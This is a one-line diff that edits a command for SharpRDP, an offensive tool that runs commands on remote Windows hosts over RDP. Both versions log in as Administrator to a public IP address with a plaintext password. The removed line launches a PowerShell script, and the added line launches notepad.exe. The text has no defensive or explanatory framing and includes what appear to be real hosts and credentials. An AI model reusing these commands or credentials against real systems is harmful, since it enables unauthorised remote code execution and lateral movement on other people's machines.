@@ -1,1 +1,1 @@
-SharpRDP.exe --server=78.140.243.66 --username=Administrator --password=RSk8H7ekUh --command="& 'C:\tempFile.ps1'" --tag=12121212 --timeout=50
+SharpRDP.exe --server=78.140.241.5 --username=Administrator --password=CIMdS16YvB --command="& 'notepad.exe'" --tag=12121212 --timeout=50
